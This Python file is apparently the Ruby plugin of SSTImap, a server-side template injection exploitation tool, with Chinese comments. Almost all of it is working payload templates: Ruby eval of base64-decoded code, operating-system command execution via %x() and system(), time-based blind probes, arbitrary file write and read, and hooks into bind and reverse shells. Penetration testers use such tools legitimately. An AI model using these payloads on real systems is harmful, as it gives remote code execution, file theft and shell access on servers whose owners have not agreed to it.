from core.plugin import Plugin
from core import bash
from utils import rand


class Ruby(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": 'Ruby 中的 Eval 注入。基于 Ruby 的模板引擎的基础',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始Tplmap插件
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': """({header[0]}+{header[1]}).to_s+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).to_s""",
                'test_render': f"""({rand.randints[0]}*{rand.randints[1]}).to_s""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                'header': """File.read("Y:/A:/"+({header[0]}+{header[1]}).to_s+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).to_s)""",
                'test_render': f"""({rand.randints[0]}*{rand.randints[1]}).to_s""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'boolean': {
                'call': 'evaluate_blind',
                'test_bool_true':  "(2 + 3).to_s == '5'",
                'test_bool_false': "(2 + 5).to_s == '3'",
                'verify_bool_true':  "'2'.length == 1",
                'verify_bool_false': "'1'.length == 2"
            },
            'blind': {
                'call': 'evaluate_blind',
                'test_bool_true': """1.to_s=='1'""",
                'test_bool_false': """1.to_s=='2'"""
            },
            'evaluate': {
                'evaluate': """({code}).to_s""",
                'call': 'render',
                'test_os': """RUBY_PLATFORM""",
                'test_os_expected': r'^[\w._-]+$'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """(require'base64';1/(!!eval(Base64.urlsafe_decode64('{code_b64}'))&&1||0)).to_s"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay})"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')}})""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """(require'base64';1 / (system(Base64.urlsafe_decode64('{code_b64}'))&&1||0)).to_s"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}})"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            'write': {
                'call': 'inject',
                'write': """require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}""",
                'truncate': """File.truncate('{path}', 0)"""
            },
            'read': {
                'call': 'evaluate',
                'read': """require'base64';Base64.encode64(File.binread("{path}"))""",
            },
            'md5': {
                'call': 'evaluate',
                'md5': """require'digest';Digest::MD5.file("{path}")"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': """require'digest';Digest::MD5.file("{path}")=='{md5}'""",
                'exists_blind': """File::file?("{path}")"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
        ])

    language = 'ruby'
